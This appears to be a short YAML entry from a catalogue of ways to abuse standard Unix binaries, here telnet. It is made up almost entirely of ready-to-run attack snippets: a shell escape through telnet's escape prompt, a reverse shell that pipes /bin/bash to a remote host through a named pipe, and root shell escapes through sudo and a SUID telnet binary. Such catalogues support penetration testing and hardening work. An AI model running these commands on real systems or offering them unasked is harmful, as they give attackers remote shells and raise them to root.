---
functions:
  exec-interactive:
    - description: BSD version only.
      code: |
        RHOST=www.google.com
        RPORT=80
        telnet $RHOST $RPORT
        ^]
        !/bin/sh
  reverse-shell:
    - description: Run `nc -l -p 12345` to receive the shell on the other end.
      code: |
        RHOST=10.0.0.1
        RPORT=12345
        TF=$(mktemp)
        rm $TF
        mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/bash 1>$TF
  sudo-enabled:
    - description: BSD version only.
      code: |
        RHOST=www.google.com
        RPORT=80
        sudo telnet $RHOST $RPORT
        ^]
        !/bin/sh
  suid-limited:
    - description: BSD version only.
      code: |
        RHOST=www.google.com
        RPORT=80
        ./telnet $RHOST $RPORT
        ^]
        !/bin/sh
      
---
